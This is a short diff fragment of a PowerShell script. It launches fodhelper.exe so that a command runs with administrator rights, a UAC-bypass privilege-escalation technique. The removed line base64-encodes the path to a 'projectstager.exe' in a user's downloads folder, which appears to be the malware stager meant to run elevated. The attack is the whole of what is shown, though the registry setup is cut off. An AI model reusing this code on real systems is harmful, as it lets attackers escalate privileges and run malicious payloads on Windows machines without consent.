@@ -27,4 +27,3 @@ Start-Sleep -Seconds 1
 # Execute fodhelper.exe, effectively running the command as admin
 Start-Process "fodhelper.exe" 
 
-[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("c:\users\polly.lu\downloads\projectstager.exe"))
